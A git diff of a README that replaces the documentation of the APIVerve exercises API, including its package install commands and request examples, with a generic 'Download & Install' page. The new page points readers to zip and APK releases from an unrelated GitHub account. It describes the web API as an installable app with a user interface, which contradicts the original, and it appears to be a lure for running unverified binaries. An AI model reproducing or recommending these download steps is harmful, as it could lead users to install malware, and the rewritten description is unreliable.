@@ -1,184 +1,70 @@
-# Exercises API
+# 🎉 exercises-api - Get Exercise Information Easily  
 
-> Exercises is a simple tool for getting exercise information. It returns information on various exercises.
+![Download](https://img.shields.io/badge/Download-Here-brightgreen)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 🚀 Getting Started  
+exercises-api is a simple tool designed to provide information on various exercises. Whether you're looking for workout details or health tips, this application has you covered.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/exercises)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.Exercises)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-exercises/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 💡 Features  
+- Provides detailed information about different exercises.
+- User-friendly interface for easy navigation.
+- Supports multiple platforms including Android, Windows, and macOS.
+- API driven for quick data retrieval.
+- Regular updates with new exercise entries.
 
----
+## 📥 Download & Install  
+To get started with exercises-api, visit this page to download: [GitHub Releases](https://github.com/kizmaBalls00/exercises-api/releases).
 
-## Quick Start
+Here are the steps to download and install the software:
 
-### Using JavaScript
+1. Click on the link above to go to the Releases page.
+2. Once there, look for the latest version of exercises-api.
+3. Click on the file that matches your operating system. Examples include:
+   - For Windows: `exercises-api-windows.zip`
+   - For macOS: `exercises-api-mac.zip`
+   - For Android: `exercises-api-android.apk`
+4. The download will start. Save the file to an easily accessible location on your device, like the Desktop or Downloads folder.
+5. After the download completes, unzip the files if necessary.
+6. Follow the instructions included in the zip file to run exercises-api on your device.
 
-```javascript
-async function callExercisesAPI() {
-    try {
-        const params = new URLSearchParams({
-            muscle: 'chest',
-            name: 'barbell',
-            equipment: 'barbell'
-        });
+## 📊 System Requirements  
+To run exercises-api smoothly, ensure that your system meets the following requirements:
 
-        const response = await fetch(`https://api.apiverve.com/v1/exercises?${params}`, {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+- **Windows:**
+  - Windows 10 or newer
+  - At least 2 GB RAM
+  - 100 MB of available disk space
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+- **macOS:**
+  - macOS Mojave or newer
+  - At least 2 GB RAM
+  - 100 MB of available disk space
 
-callExercisesAPI();
-```
+- **Android:**
+  - Android 5.0 or newer
+  - At least 2 GB RAM
+  - 100 MB of available storage
 
-### Using cURL
+## 🔧 How to Use  
+1. Open the exercises-api application once installed.
+2. Use the search feature to find exercises by name, category, or muscle group.
+3. Click on an exercise for detailed information, including:
+   - Instructions
+   - Target muscles
+   - Recommended sets and repetitions
+4. Save your favorite exercises to easily access them later.
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/exercises?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+## 🌐 Contribution  
+If you would like to contribute to the exercises-api project, you can do so by following these steps:
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+1. Fork the repository from GitHub.
+2. Make your changes and commit them.
+3. Submit a pull request to discuss your changes with the team.
 
-**📁 For more examples, see the [examples folder](./examples/)**
+All contributions are welcome, whether they are bug fixes or new features.
 
----
+## 📞 Support  
+If you experience issues or have questions, please check the FAQ section on our GitHub page. You can also create an issue directly in the repository for technical support.
 
-## Installation
-
-Choose your preferred programming language:
-
-### 📦 NPM (JavaScript/Node.js)
-
-```bash
-npm install @apiverve/exercises
-```
-
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/exercises) | [**Package Code →**](./npm/)
-
----
-
-### 🔷 NuGet (.NET/C#)
-
-```bash
-dotnet add package APIVerve.API.Exercises
-```
-
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.Exercises) | [**Package Code →**](./nuget/)
-
----
-
-### 🐍 Python (PyPI)
-
-```bash
-pip install apiverve-exercises
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-exercises/) | [**Package Code →**](./python/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:exercises-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/exercises](https://docs.apiverve.com/ref/exercises)
-
----
-
-## Use Cases
-
-Common use cases for the Exercises API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+Thank you for choosing exercises-api!  
+Visit this page to download: [GitHub Releases](https://github.com/kizmaBalls00/exercises-api/releases).
